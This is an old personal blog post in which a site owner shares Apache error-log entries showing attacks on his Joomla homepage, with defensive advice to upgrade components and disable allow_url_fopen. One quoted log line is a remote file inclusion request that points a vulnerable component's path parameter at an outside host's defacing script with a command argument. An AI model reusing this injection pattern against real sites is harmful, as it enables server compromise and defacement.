---
id: 2683
title: 'Hackers  are using scripts to hack my page&#8230;'
date: '2006-08-17T21:38:37+02:00'
author: 'Cédric Walter'

guid: 'https://waltercedric.com/new/?p=2683'
permalink: /internet/hackers-are-using-scripts-to-hack-my-page/
image: /wp-content/uploads/2006/08/pirate.gif
tags:
    - homepage
    - 'My Homepage'
---

| ![](/assets/images/2006/08/pirate.gif) | I’ve already tried to reduce [the surface of attack of my homepage](http://www.owasp.org/index.php/Minimize_attack_surface_area) by removing all un-needed components, modules, mambots but here is below what I’ve found into the log files… |
|---|---|

<span style="font-weight: bold;">Hackers trying remote code injection

were found more than one time in apache error.log

<span style="font-style: italic;">\[Thu Aug 17 17:29:05 2006\] \[error\] \[client 81.214.151.223\] Invalid URI in request GET administrator/components/com\_bayesiannaivefilter/lang.php?mosConfig\_absolute\_path=\[http://recon.reschat.dk/images/gallery/tool25.txt?cmd=id HTTP/1.0

Remember You should ASAP update the following components to their latest version:

- <span style="font-weight: bold;">com\_securityimages < 3.0.5 use at least a version > 3.0.6
- <span style="font-weight: bold;">com\_hashcash < 1.2.1 use at least a version > 1.2.2
- <span style="font-weight: bold;">com\_bayesiannaivefilter has been developed but never release as a component, but it is still available at #Joomla forge developer tree.

This attack is trying to execute a scripts, locate at <span style="font-style: italic;">http://recon.reschat.dk/images/gallery/tool25.txt. If You go there, You’ll find that th script is readable and contains a header.

```
Defacing Tool 2.0 by xxxxxx


```

Defacing Tool 2.0 by xxxxxxx" is a suite of php based scripts that allows the attacker to send commands to the server primarily with the intent to deface websites.

<span style="font-weight: bold;">Solutions:

1. For <span style="font-weight: bold;">com\_bayesiannaivefilter sorry guys but I do not have this plugins nor it has ever been released in the wild. com\_securityimages or com\_hashcash, just <span style="font-weight: bold; text-decoration: underline;">Upgrade!
2. If you manage a web host for which you are certain does not require the use of remote includes, you can disable that functionality in your php.ini configuration file by modifying the following variable. /etc/php.ini <span style="font-family: courier new,courier,mono;"> allow\_url\_fopen = Off

  <span style="font-weight: bold;">Hackers trying to access well known PHP files

each lines below at least more than 500 times…in 1 day<span style="font-weight: bold;">  
  
<span style="font-style: italic;">\[Fri Aug 11 19:11:50 2006\] \[error\] \[client 221.87.148.77\] Directory index forbidden by rule: /var/www/vhosts/waltercedric.com/httpdocs/components/com\_htmlarea3\_xtd-c/popups/ImageManager/  
<span style="font-style: italic;">\[Mon Jul 31 13:07:12 2006\] \[error\] \[client 85.108.201.139\] user not found: /administrator/components/com\_bayesiannaivefilter/lang.php  
<span style="font-style: italic;">\[Mon Jul 31 13:07:19 2006\] \[error\] \[client 85.108.201.139\] user admin: authentication failure for "/administrator/components/com\_bayesiannaivefilter/lang.php": Password Mismatch  
<span style="font-style: italic;">\[Sat Feb 18 21:44:47 2006\] \[error\] \[client 80.218.20.20\] File does not exist: /var/www/vhosts/waltercedric.com/httpdocs/var, referer: http://www.waltercedric.com/administrator/index2.php?option=com\_zoom&amp;Itemid=&amp;page=upload&amp;formtype=scan

<span style="font-weight: bold;">Hacker trying to access files that do not exist

- /var/www/vhosts/waltercedric.com/subdomains/wiki/httpdocs/com\_hashcash
- wiki/administrator/
- \[Tue Aug 01 21:09:46 2006\] \[error\] \[client 200.120.37.70\] user not found: /administrator/components/com\_uhp/uhp\_config.php
- \[Tue Aug 01 20:43:03 2006\] \[error\] \[client 200.120.37.70\] user not found: /administrator/components/com\_colophon/admin.colophon.php
- <span style="font-style: italic;">\[Mon Jul 31 20:11:25 2006\] \[error\] \[client 88.233.220.125\] user not found: /administrator/components/com\_mgm/help.mgm.php

which look like programs brute forcing with a set of rules some paths searching well known vulnerability

<span style="font-weight: bold;">Some strange attempts…

<span style="font-style: italic;">\[Tue Aug 01 18:49:11 2006\] \[error\] \[client 213.84.64.236\] File does not exist: /var/www/vhosts/waltercedric.com/subdomains/wiki/httpdocs/MSOffice  
<span style="font-style: italic;">\[Tue Aug 01 18:48:47 2006\] \[error\] \[client 213.84.64.236\] File does not exist: /var/www/vhosts/waltercedric.com/subdomains/forums/httpdocs/\_vti\_bin  
<span style="font-style: italic;">\[Tue Aug 01 18:48:47 2006\] \[error\] \[client 213.84.64.236\] File does not exist: /var/www/vhosts/waltercedric.com/subdomains/forums/httpdocs/MSOffice  
<span style="font-style: italic;">\[Tue Aug 01 18:49:11 2006\] \[error\] \[client 213.84.64.236\] File does not exist: /var/www/vhosts/waltercedric.com/subdomains/wiki/httpdocs/\_vti\_bin  
<span style="font-style: italic;">\[Mon Jul 31 16:58:44 2006\] \[error\] \[client 207.46.98.40\] File does not exist: /var/www/vhosts/waltercedric.com/subdomains/demo/httpdocs/function.fopen  
<span style="font-style: italic;">\[Fri Jul 28 23:04:35 2006\] \[error\] \[client 85.103.107.26\] File does not exist: /var/www/vhosts/waltercedric.com/subdomains/wiki/httpdocs/path=attacker-example.com